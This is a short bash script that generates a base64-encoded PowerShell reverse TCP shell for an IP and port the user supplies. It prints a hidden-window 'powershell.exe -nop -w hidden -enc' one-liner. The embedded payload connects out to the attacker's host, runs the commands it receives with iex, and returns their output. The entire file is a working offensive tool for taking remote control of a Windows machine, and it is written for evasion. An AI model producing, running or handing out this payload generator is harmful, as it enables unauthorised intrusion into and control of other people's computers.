#!/bin/bash

# Function to display usage information
show_usage() {
    echo "Usage: $0 <IP> <Port>"
    echo ""
    echo "Generate a base64 encoded PowerShell command for establishing a reverse TCP connection."
}

# Check for help option
if [ "$1" == "-h" ] || [ "$1" == "--help" ]; then
    show_usage
    exit 0
fi

# Check if two arguments are provided
if [ "$#" -ne 2 ]; then
    show_usage
    exit 1
fi

# Assign arguments to variables
IP=$1
PORT=$2

# Run PowerShell commands using pwsh and capture the output
EncodedText=$(pwsh -Command "
\$Text = '\$client = New-Object System.Net.Sockets.TCPClient(\"$IP\",$PORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()'
\$Bytes = [System.Text.Encoding]::Unicode.GetBytes(\$Text)
[Convert]::ToBase64String(\$Bytes)
")
echo powershell.exe -nop -w hidden -enc $EncodedText
